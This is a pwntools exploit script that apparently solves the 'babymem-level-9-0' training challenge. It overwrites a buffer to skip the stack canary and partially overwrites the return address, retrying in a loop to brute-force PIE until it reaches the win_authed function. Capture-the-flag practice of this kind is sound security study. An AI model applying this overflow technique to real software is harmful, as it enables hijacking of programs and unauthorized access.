#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babymem-level-9-0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './babymem-level-9-0')
rop = ROP(exe)
context.terminal = ['wt.exe', '-w', '0', 'nt', 'wsl.exe', '--']
context.delete_corefiles = True

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# tbreak main
# break read
# break *challenge+1806
break *challenge+2336
break win_authed
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

while True:
    io = start()

    # shellcode = asm(shellcraft.sh())
    # payload = fit({
    #     32: 0xdeadbeef,
    #     'iaaa': [1, 2, 'Hello', 3]
    # }, length=128)
    # io.send(payload)
    # flag = io.recv(...)
    # log.success(flag)
    pay = flat({9*8: p8(13*8- 1) + p16(0x5587)})
    # pay = flat({9*8: p8(13*8 - 1) + p16(0xdeadbeef)})
    # io.sendline(str(300))   
    # pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    io.sendline(str(13*8 + 2)   )
    io.send(pay + b"A"*(300-len(pay)))

    a = io.recvall()

    if b"Goodbye!\nYou win" in a:
        print(a.decode())
        break
